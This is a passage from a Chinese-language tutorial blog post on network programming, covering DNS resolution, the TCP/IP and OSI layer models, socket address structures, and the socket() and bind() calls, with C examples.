operator">=</span> <span class="token number">25</span><span class="token punctuation">,</span>   <span class="token comment">/* Simple Mail Transfer Protocol.  */</span>    IPPORT_TIMESERVER <span class="token operator">=</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token comment">/* Timeserver service.  */</span>    IPPORT_NAMESERVER <span class="token operator">=</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token comment">/* Domain Name Service.  */</span>    IPPORT_WHOIS <span class="token operator">=</span> <span class="token number">43</span><span class="token punctuation">,</span>    <span class="token comment">/* Internet Whois service.  */</span>    IPPORT_MTP <span class="token operator">=</span> <span class="token number">57</span><span class="token punctuation">,</span>    IPPORT_TFTP <span class="token operator">=</span> <span class="token number">69</span><span class="token punctuation">,</span>   <span class="token comment">/* Trivial File Transfer Protocol.  */</span>    IPPORT_RJE <span class="token operator">=</span> <span class="token number">77</span><span class="token punctuation">,</span>    IPPORT_FINGER <span class="token operator">=</span> <span class="token number">79</span><span class="token punctuation">,</span>   <span class="token comment">/* Finger service.  */</span>    IPPORT_TTYLINK <span class="token operator">=</span> <span class="token number">87</span><span class="token punctuation">,</span>    IPPORT_SUPDUP <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">,</span>   <span class="token comment">/* SUPDUP protocol.  */</span>    IPPORT_EXECSERVER <span class="token operator">=</span> <span class="token number">512</span><span class="token punctuation">,</span>  <span class="token comment">/* execd service.  */</span>    IPPORT_LOGINSERVER <span class="token operator">=</span> <span class="token number">513</span><span class="token punctuation">,</span> <span class="token comment">/* rlogind service.  */</span>    IPPORT_CMDSERVER <span class="token operator">=</span> <span class="token number">514</span><span class="token punctuation">,</span>    IPPORT_EFSSERVER <span class="token operator">=</span> <span class="token number">520</span><span class="token punctuation">,</span>    <span class="token comment">/* UDP ports.  */</span>    IPPORT_BIFFUDP <span class="token operator">=</span> <span class="token number">512</span><span class="token punctuation">,</span>    IPPORT_WHOSERVER <span class="token operator">=</span> <span class="token number">513</span><span class="token punctuation">,</span>    IPPORT_ROUTESERVER <span class="token operator">=</span> <span class="token number">520</span><span class="token punctuation">,</span>    <span class="token comment">/* Ports less than this value are reserved for privileged processes.  */</span>    IPPORT_RESERVED <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">,</span>    <span class="token comment">/* Ports greater this value are reserved for (non-privileged) servers.  */</span>    IPPORT_USERRESERVED <span class="token operator">=</span> <span class="token number">5000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>​</p><h4 id="1-1-5-域名系统">1.1.5 域名系统</h4><ul><li><p>IP 协议的职责是<strong>网际互连</strong>，它使用 IP 地址把 MAC 编号转换成了四位数字，对物理网卡的 MAC 地址做了一层抽象，只要每个小网络在 IP 地址这个概念上达成一致，不管在 MAC 层有多大的差异，都可以接入 TCP/IP 协议栈，终汇合进整个互联网</p></li><li><p>但数字形式的地址对于人类来说却既难以记忆又难以输入，于是<strong>域名系统</strong><code>Domain Name System</code>出现了，用有意义的名字来作为 IP 地址的等价替代，在 IP 地址之上再进行一次抽象</p></li></ul><p>​</p><p>​</p><h5 id="域名的形式">域名的形式</h5><ul><li><p>在 DNS 中，<strong>域名</strong><code>Domain Name</code>又称为<strong>主机名</strong><code>Host</code></p></li><li><p>全球域名按照从大到小的结构，形成了一棵树状结构，实际访问一个域名时，是从最底层开始写起，域名用 <code>.</code> 分隔成多个单词，级别从左到右逐级升高，最右边的被称为<strong>顶级域名</strong></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210129-domain-name.png" alt=""></p></li><li><p>域名还有许多其他的用途：在Web服务器中，域名可以用来标识虚拟主机，决定由哪个虚拟主机来对外提供服务，比如在 Nginx 里就会使用<code>server_name</code>指令：</p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>        <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>                <span class="token comment"># 监听 80 端口    </span>    <span class="token keyword">server_name</span>  a<span class="token punctuation">.</span>test<span class="token punctuation">.</span>com<span class="token punctuation">;</span>  <span class="token comment"># 主机名是 a.test.com  </span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>域名本质上是个<strong>名字空间系统</strong>，使用多级域名就可以划分出不同的国家、地区、组织、公司、部门，每个域名都是独一无二的，可以作为一种身份的标识，因为这个特性，域名也被扩展到了其他应用领域</p><ul><li>比如 Java 的包机制采用域名作为命名空间</li><li><code>XML</code> 里使用 <code>URI</code> 作为名字空间，也间接使用了域名</li></ul></li></ul><p>​</p><h5 id="域名的解析">域名的解析</h5><ul><li><p>IP 地址必须转换成 MAC 地址才能访问主机，使用 TCP/IP 协议来通信要使用 IP 地址，所以需要把域名做转换，<strong>映射</strong>到它的真实 IP，这就是域名解析</p></li><li><p>DNS 的核心系统是一个三层的树状分布式服务，基本对应域名的结构：</p><ul><li><p>根域名服务器 <code>Root DNS Server</code>：管理顶级域名服务器，返回 com、net、cn 等顶级域名服务器的 IP 地址</p></li><li><p>顶级域名服务器 <code>Top-level DNS Server</code>：管理各自域名下的权威域名服务器，比如  com 顶级域名服务器可以返回 <a href="http://apple.com">apple.com</a> 域名服务器的 IP 地址</p></li><li><p>权威域名服务器 <code>Authoritative DNS Server</code>：管理自己域名下主机的 IP 地址，比如 <a href="http://apple.com">apple.com</a> 权威域名服务器可以返回 <a href="http://www.apple.com">www.apple.com</a> 的 IP 地址</p></li></ul></li><li><p>根域名服务器必须是众所周知的，目前全世界共有 13 组根域名服务器，又有数百台的镜像，保证一定能够被访问到，有了这个系统以后，任何一个域名都可以在这个树形结构里<strong>从顶至下进行查询</strong>（把域名从右到左走了一遍），获得域名对应的 IP</p><blockquote><ol><li>目前全世界有 13 组根 DNS 服务器，因为 DNS 协议里包大小的限制（512 字节），再除以 DNS 记录长度，最多 15 组，再去掉 buffer</li><li>HTTP 协议中并没有明确要求必须使用 DNS，但实际上为了方便访问互联网上的 Web 服务器，通常都会使用 DNS 来定位或标记主机名，间接地把 DNS 与 HTTP 绑在了一起</li></ol></blockquote></li><li><p>在核心 DNS 系统之外，还有两种手段用来减轻域名解析的压力，基本思路就是<strong>缓存</strong></p><ul><li><p>大公司、网络运行商都会建立自己的 DNS 服务器作为用户 DNS 查询的代理，这些服务器被称为<strong>非权威域名服务器</strong>，可以缓存之前的查询结果，如果已经有了记录，就无需再向根服务器发起查询，直接返回对应的 IP 地址，这些 DNS 服务器的数量要比核心系统的服务器多很多，而且大多部署在离用户很近的地方（比较知名的 DNS 有 Google 的<strong>8.8.8.8</strong>，Microsoft 的<strong>4.2.2.1</strong>，CloudFlare 的<strong>1.1.1.1</strong>）</p></li><li><p>操作系统里也会对 DNS 解析结果做缓存，直接在操作系统里就可以拿到 IP 地址，另外，操作系统里还有一个特殊的<strong>主机映射</strong>文件（在 Linux 里是<code>/etc/hosts</code>，在 Windows 里是<code>C:\WINDOWS\system32\drivers\etc\hosts</code>），如果操作系统在缓存里找不到 DNS 记录，就会找这个文件</p></li></ul></li></ul><blockquote><p><strong>总结</strong>：DNS 是一个树状的分布式查询系统，为了提高查询效率，外围有多级的缓存</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210129-dns-architecture.png" alt="现在的DNS架构"></p></blockquote><p>​</p><h5 id="负载均衡">负载均衡</h5><ul><li><p>重定向，对外服务的域名不变，而主机的 IP 地址变动。当主机有情况需要下线或迁移时，可以更改 DNS 记录让域名指向其他机器。</p></li><li><p><strong>基于域名实现的负载均衡</strong></p><ul><li><p>域名解析可以返回多个 IP 地址，客户端收到多个 IP 地址后，使用轮询算法依次向服务器发起请求，实现负载均衡</p></li><li><p>域名解析可以配置内部的策略，返回离客户端近的主机或者当前服务质量好的主机，在 DNS 端把请求分发到不同的服务器</p></li></ul></li></ul><p>​</p><h4 id="1-1-6-数据报和字节流">1.1.6 数据报和字节流</h4><ul><li><p>TCP又叫<strong>字节流套接字</strong><code>Stream Socket</code>，<strong>UDP</strong> 又叫<strong>数据报套接字</strong><code>Datagram Socket</code>，一般以<code>SOCK_STREAM</code>与<code>SOCK_DGRAM</code>分别表示 TCP 和 UDP 套接字，<code>Datagram Sockets</code> 有时称为无连接的 sockets<code>connectionless sockets</code></p></li><li><p>字节流套接字是可靠的，双向连接的通讯串流，TCP 通过诸如<strong>连接管理，拥塞控制，数据流与窗口管理，超时和重传</strong>等一系列精巧而详细的设计，提供了高质量的端到端的通信方式</p></li><li><p>数据报套接字也可以做到更高的可靠性，只不过这种可靠性，需要应用程序进行设计处理，比如对报文进行编号，设计 <code>Request-Ack</code> 机制，再加上重传等，在一定程度上可以达到更为高可靠的 UDP 程序</p></li></ul><p>​</p><p>​</p><h4 id="1-1-7-其他">1.1.7 其他</h4><p>​</p><p>​</p><h3 id="1-2-网络分层">1.2 网络分层</h3><h4 id="TCP-IP-网络分层模型">TCP/IP 网络分层模型</h4><ol><li><p>链接层<code>link layer</code>，负责在以太网、WiFi 这样的底层网络上发送原始数据包，工作在网卡这个层次，使用 MAC 地址来标记网络上的设备，所以有时也叫 <code>MAC</code> 层</p></li><li><p>网际层或网络互连层<code>internet layer</code>，IP 协议就处在这一层，可以在链接层的基础上，用 IP 地址取代 MAC 地址，把许许多多的局域网、广域网连接成一个虚拟的巨大网络，在这个网络里找设备时只需要把 IP 地址翻译成 MAC 地址</p></li><li><p>传输层<code>transport layer</code>，这个层次协议的职责是保证数据在 IP 地址标记的两点之间可靠地传输，是 TCP 协议工作的层次</p></li><li><p>应用层<code>application layer</code>，有各种面向具体应用的协议（如 Telnet、SSH、FTP、SMTP、<a href="https://night-candle.github.io/2021/02/04/cs-network-protocol/#toc-heading-5">HTTP</a>）</p><blockquote><p>MAC 层的传输单位是<strong>帧</strong><code>frame</code>，IP 层的传输单位是<strong>包</strong><code>packet</code>，TCP 层的传输单位是<strong>段</strong><code>segment</code>，HTTP 的传输单位则是<strong>消息</strong>或<strong>报文</strong><code>message</code>，它们可以统称为<strong>数据包</strong></p></blockquote><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210128-tcpip.png" alt=""></p></li></ol><p>​</p><h4 id="OSI-网络分层模型">OSI 网络分层模型</h4><ol><li><p><strong>物理层</strong>，网络的物理形式，例如电缆、光纤、网卡、集线器等等</p></li><li><p><strong>数据链路层</strong>，它基本相当于 TCP/IP 的链接层</p></li><li><p><strong>网络层</strong>，相当于 TCP/IP 里的网际层</p></li><li><p><strong>传输层</strong>，相当于 TCP/IP 里的传输层</p></li><li><p><strong>会话层</strong>，维护网络中的连接状态，即保持会话和同步</p></li><li><p><strong>表示层</strong>，把数据转换为合适、可理解的语法和语义</p></li><li><p><strong>应用层</strong>，面向具体的应用传输数据</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210128-osi.png" alt=""></p><blockquote><p>常用术语：</p><p><strong>四层负载均衡</strong>：工作在传输层上，基于 TCP/IP 协议的特性，例如 IP 地址、端口号等实现对后端服务器的负载均衡<br><strong>七层负载均衡</strong>：工作在应用层上，看到的是 HTTP 协议，解析 HTTP 报文里的 URI、主机名、资源类型等数据，再用适当的策略转发给后端服务器<br><strong>三层路由</strong>：设备工作在ip层，报文经过有路由功能的设备时，设备分析报文中的头部信息，拿到ip地址，根据网段范围，进行本地转发或选择下一个网关<br><strong>二层转发</strong>：设备工作在链路层，帧在经过交换机设备时，检查帧的头部信息，拿到目标mac地址，进行本地转发和广播</p></blockquote></li></ol><p>​</p><h4 id="5-层参考模型">5 层参考模型</h4><ul><li><p>TCP/IP 是一个纯软件的栈，没有网络应有的最根基的电缆、网卡等物理设备的位置，而 OSI 则补足了这个缺失，在理论层面上描述网络更加完整</p></li><li><p>OSI 的分层模型在四层以上分的太细，而 TCP/IP 实际应用时的会话管理、编码转换、压缩等和具体应用经常联系的很紧密，很难分开</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210128-map.png" alt="对应关系"></p></li><li><p>因此有了结合 OSI 和 TCP/IP 优点的 5 层参考模型</p></li></ul><p>​</p><p>​</p><h3 id="1-3-Socket-套接字">1.3 Socket 套接字</h3><h4 id="Socket-是什么？">Socket 是什么？</h4><ul><li><p><code>socket</code> 译为<strong>套接字</strong>， 在网络编程中寓意是可以通过插口接入的方式，快速完成网络连接和数据收发，它把 TCP/IP 层复杂的操作抽象为几个简单的接口供应用层调用以实现进程在网络中通信</p><blockquote><p><em>To allow for many processes within a single Host to use TCP communication facilities simultaneously, the TCP provides a set of addresses or ports within each host.  Concatenated with the network and host addresses from the internet communication layer, this forms a socket.  A pair of sockets uniquely identifies each connection.</em>（RFC793）</p></blockquote></li><li><p>理解 socket</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210202-server-client.png" alt="客户端和服务器工作核心逻辑"></p><ul><li><p>服务器端初始化的过程：首先初始化 <code>socket</code>，之后需要执行 <code>bind</code> 函数，将自己的服务能力绑定在一个固定的地址和端口上，紧接着执行 <code>listen</code> 操作，将原先的 <code>socket</code> 转化为服务端的 <code>socket</code>，服务端最后阻塞在 <code>accept</code> 上，此时，服务器端已经准备就绪，等待客户端的请求</p></li><li><p>客户端需要先初始化 <code>socket</code>，再执行 <code>connect</code> 向服务器端的地址和端口发起连接请求</p><p>这个过程就是<strong>TCP 三次握手</strong><code>Three-way Handshake</code>，三次握手完成，客户端和服务器端建立连接，就进入了数据传输过程，<strong>一旦连接建立，数据的传输就不再是单向的，而是双向的</strong></p><blockquote><p>具体来说，客户端进程向操作系统内核发起 <code>write</code> 字节流写操作，内核协议栈将字节流通过网络设备传输到服务器端，服务器端从内核得到信息，将字节流从内核读入到进程中，并开始业务逻辑的处理，完成之后，服务器端再将得到的结果以同样的方式写给客户端</p></blockquote></li><li><p>四次挥手：当客户端交互完成需断开连接时，会执行 <code>close</code> 函数，内核此时会通过原先的连接链路向服务端发送一个 <code>FIN</code> 包，服务端收到之后执行被动关闭，这时候整个链路处于半关闭状态，此后服务端也会执行 <code>close</code> 函数，整个链路才会真正关闭，<strong>半关闭的状态下，发起 close 请求的一方在没有收到对方 FIN 包之前都认为连接是正常的</strong>，而在全关闭的状态下，双方都感知连接已经关闭</p></li><li><p>以上所有的操作，都是通过 <code>socket</code> 来完成的，无论是 <code>connect</code>还是 <code>accept</code>，或者 <code>read/write</code> 操作等，<strong>socket 是用来建立连接，传输数据的唯一途径</strong></p></li></ul></li></ul><p>​</p><p>​</p><h4 id="Socket-发展历史">Socket 发展历史*</h4><ul><li><p><code>socket</code> 是加州大学伯克利分校的研究人员在 20 世纪 80 年代早期提出的，所以也被叫做伯克利套接字，研究者们设想<strong>用 socket 的概念屏蔽掉底层协议栈的差别</strong></p></li><li><p>第一版实现 <code>socket</code> 的就是 <code>TCP/IP</code> 协议，最早是在 <strong>BSD 4.2 Unix 内核</strong>上实现了 socket</p></li><li><p>很快人们就发现这么一个概念带来了网络编程的便利，Linux 作为 Unix 系统的一个开源实现，很早就从头开发实现了 TCP/IP 协议，伴随着 socket 的成功，Windows 也引入了 socket 的概念，在今天的世界里，socket 成为网络互联互通的标准</p></li></ul><p>​</p><p>​</p><h4 id="套接字地址格式">套接字地址格式</h4><ul><li><p>在使用套接字时，首先要解决通信双方寻址的问题</p></li><li><p>下面是套接字的<strong>通用</strong>地址结构（适用于多种地址族）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* POSIX.1g 规范规定了地址族为 2 字节的值.  */</span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> sa_family_t<span class="token punctuation">;</span><span class="token comment">/* 描述通用套接字地址  */</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span><span class="token punctuation">{</span>    sa_family_t sa_family<span class="token punctuation">;</span>  <span class="token comment">/* 地址族.  16-bit*/</span>    <span class="token keyword">char</span> sa_data<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">/* 具体的地址值 112-bit */</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结构体里第一个字段是<strong>地址族</strong>，表示<strong>使用什么样的方式对地址进行解释和保存</strong>，地址族在 glibc 里的定义非常多，常用的有：</p><ul><li><p><code>AF_LOCAL</code>：表示的是本地地址，对应的是 <code>Unix</code> 套接字，这种情况一般用于本地 <code>socket</code> 通信，很多情况下也可以写成 <code>AF_UNIX</code>、<code>AF_FILE</code></p></li><li><p><code>AF_INET</code>：因特网使用的 IPv4 地址</p></li><li><p><code>AF_INET6</code>：因特网使用的 IPv6 地址</p></li></ul></li><li><p><code>AF_</code> 含义是 <code>Address Family</code>，还有以 <code>PF_</code> 表示的宏，含义是 <code>Protocol Family</code>（协议族），用 AF_ 这样的值来初始化 socket 地址，用 PF_ 这样的值来初始化 socket</p><p>在 <code>&lt;sys/socket.h&gt;</code> 头文件中可以看到这两个值是一一对应的</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* 各种地址族的宏定义  */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_UNSPEC PF_UNSPEC</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_LOCAL  PF_LOCAL</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_UNIX   PF_UNIX</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_FILE   PF_FILE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_INET   PF_INET</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_AX25   PF_AX25</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_IPX    PF_IPX</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_APPLETALK  PF_APPLETALK</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_NETROM PF_NETROM</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_BRIDGE PF_BRIDGE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_ATMPVC PF_ATMPVC</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_X25    PF_X25</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_INET6  PF_INET6</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>套接字地址格式比较</strong></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210401-address-family-compare.png" alt=""></p></li></ul><p>​</p><h5 id="IPv4-套接字格式地址">IPv4 套接字格式地址*</h5><ul><li><p>常用的 IPv4 地址族的结构</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* IPV4 套接字地址，32bit 值.  */</span><span class="token keyword">typedef</span> uint32_t in_addr_t<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">in_addr</span>  <span class="token punctuation">{</span>    in_addr_t s_addr<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">/* 描述 IPV4 的套接字地址格式  */</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span>  <span class="token punctuation">{</span>    sa_family_t sin_family<span class="token punctuation">;</span> <span class="token comment">/* 16-bit */</span>    in_port_t sin_port<span class="token punctuation">;</span>     <span class="token comment">/* 端口口  16-bit*/</span>    <span class="token keyword">struct</span> <span class="token class-name">in_addr</span> sin_addr<span class="token punctuation">;</span>    <span class="token comment">/* Internet address. 32-bit */</span>        <span class="token comment">/* 这里仅仅用作占位符，不做实际用处  */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> sin_zero<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>sockaddr_in</code>与 <code>sockaddr</code> 一样，都有一个 16-bit 的 <code>sin_family</code> 字段，对于 IPv4 来说这个值就是 <code>AF_INET</code></li><li>端口号最多是 16-bit，最大支持 $2^{16}$= 65536，支持寻址的端口号最多就是 65535</li></ul></li><li><p>IPv4 地址是一个 32-bit 的字段，最多支持的地址数就是$2^{32}$，大约是 42 亿，但随着互联网发展，全球接入的设备越来越多，地址渐渐显得不太够用了</p></li></ul><p>​</p><h5 id="IPv6-套接字地址格式">IPv6 套接字地址格式*</h5><ul><li><p>IPv6 的地址结构</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in6</span>  <span class="token punctuation">{</span>    sa_family_t sin6_family<span class="token punctuation">;</span> <span class="token comment">/* 16-bit */</span>    in_port_t sin6_port<span class="token punctuation">;</span>  <span class="token comment">/* 传输端口号 # 16-bit */</span>    uint32_t sin6_flowinfo<span class="token punctuation">;</span> <span class="token comment">/* IPv6 流控信息 32-bit*/</span>    <span class="token keyword">struct</span> <span class="token class-name">in6_addr</span> sin6_addr<span class="token punctuation">;</span>  <span class="token comment">/* IPv6 地址 128-bit */</span>    uint32_t sin6_scope_id<span class="token punctuation">;</span> <span class="token comment">/* IPv6 域 ID 32-bit */</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>整个结构体长度是 28 个字节，地址族是 <code>AF_INET6</code>，端口同 IPv4 地址一样（其中流控信息和域 IP 这两个字段，一个在 glibc 的官网上没出现，另一个是当前未使用的字段）</p></li><li><p>地址从 32 位升级到 128 位，完全解决了寻址数字不够的问题</p></li></ul><h5 id="本地套接字地址格式">本地套接字地址格式*</h5><ul><li><p>本地套接字用来做为本地进程间的通信，即 <code>AF_LOCAL</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> <span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> sun_family<span class="token punctuation">;</span> <span class="token comment">/* 固定为 AF_LOCAL */</span>    <span class="token keyword">char</span> sun_path<span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">/* 路径名 */</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>为什么本地套接字格式不需要端口号，而 IPv4 和 IPv6 套接字格式却需要端口号呢？</p><p><strong>一切皆文件，socket也是文件</strong>，socket基于文件操作，<strong>因此只需要根据文件路径便可区分，不需要使用端口</strong>，也正因如此，IPv4 和 IPv6 套接字地址结构的长度是固定的，而本地地址是可变的</p></blockquote></li></ul><p>​</p><p>​</p><h3 id="1-4-TCP-建立连接">1.4 TCP 建立连接</h3><h4 id="服务端准备连接">服务端准备连接</h4><p>​</p><h5 id="创建套接字">创建套接字</h5><ul><li><p>要创建一个可用的套接字，使用 socket 函数：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">socket</span><span class="token punctuation">(</span><span class="token keyword">int</span> domain<span class="token punctuation">,</span> <span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">int</span> protocol<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>domain</code> 指 <code>PF_INET</code>、<code>PF_INET6</code> 、 <code>PF_LOCAL</code> 等，表示什么样的套接字</li><li><code>type</code> 可用的值：</li><li><code>SOCK_STREAM</code>: 表示字节流，对应 <code>TCP</code></li><li><code>SOCK_DGRAM</code>： 表示数据报，对应 <code>UDP</code></li><li><code>SOCK_RAW</code>: 表示原始套接字</li><li><code>protocol</code> 原本是用来指定通信协议，但现在基本废弃（因为协议已经通过前面两个参数指定完成，目前一般写成 0 即可）</li></ul></li></ul><p>​</p><p>​</p><h5 id="bind">bind</h5><p>​</p><ul><li><p>创建的套接字如果需要被使用，就需调用 <code>bind</code> 函数将套接字和套接字地址绑定：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> sockaddr <span class="token operator">*</span> addr<span class="token punctuation">,</span> socklen_t len<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><code>sockaddr * addr</code>通用地址格式（但实际上传入的参数可能是 IPv4、IPv6 或者本地套接字格式）</p></li><li><p><code>len</code> 字段表示的就是传入的地址长度，是一个可变值，bind 函数会根据 <code>len</code> 字段判断传入的参数 <code>addr</code> 该怎么解析</p></li></ul><blockquote><p>BSD 设计套接字的时候 C 语言还没有<code>void *</code>的支持，所以 BSD 的设计者们设计了通用地址格式来作为支持 <code>bind</code> 和 <code>accept</code> 等这些函数的参数，对使用者来说，每次需要将 IPv4、IPv6 或者本地套接字格式转化为通用套接字格式</p></blockquote></li></ul><p>​</p><ul><li><p>设置 bind 时对地址和端口可以有多种处理方式：</p><ul><li><p><strong>把地址设置成本机 IP 地址</strong>，相当于告诉系统内核仅对目标 IP 是本机 IP 地址的包进行处理，对部署前 IP 地址不确定的问题，可以利用<strong>通配地址</strong>的能力帮助解决，IPv4 地址使用 <code>INADDR_ANY</code> 、 IPv6使用 <code>IN6ADDR_ANY</code> 来完成通配地址的设置</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> name<span class="token punctuation">;</span>name<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">htonl</span> <span class="token punctuation">(</span>INADDR_ANY<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* IPV4 通配地址 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>如果把端口设置成 0，就相当于把端口的选择权交给操作系统内核，操作系统内核会选择一个空闲的端口，完成套接字的绑定。这在服务器端不常使用，一般来说服务器端的程序要绑定到一个众所周知的端口上</p></li></ul></li></ul><p>​</p><ul><li><p>初始化 IPv4 TCP 套接字的例子</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">make_socket</span> <span class="token punctuation">(</span>uint16_t port<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> sock<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> name<span class="token punctuation">;</span>      <span class="token comment">/* 创建字节流类型的 IPV4 socket. */</span>  sock <span class="token operator">=</span> <span class="token function">socket</span> <span class="token punctuation">(</span>PF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>sock <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">perror</span> <span class="token punctuation">(</span><span class="token string">"socket"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span> <span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token comment">/* 绑定到 port 和 ip. */</span>  name<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span> <span class="token comment">/* IPV4 */</span>  name<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span> <span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* 指定端口 */</span>  name<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">htonl</span> <span class="token punctuation">(</span>INADDR_ANY<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* 通配地址 */</span>  <span class="token comment">/* 把 IPV4 地址转换成通用地址格式，同时传递长度 */</span>  <span class="token 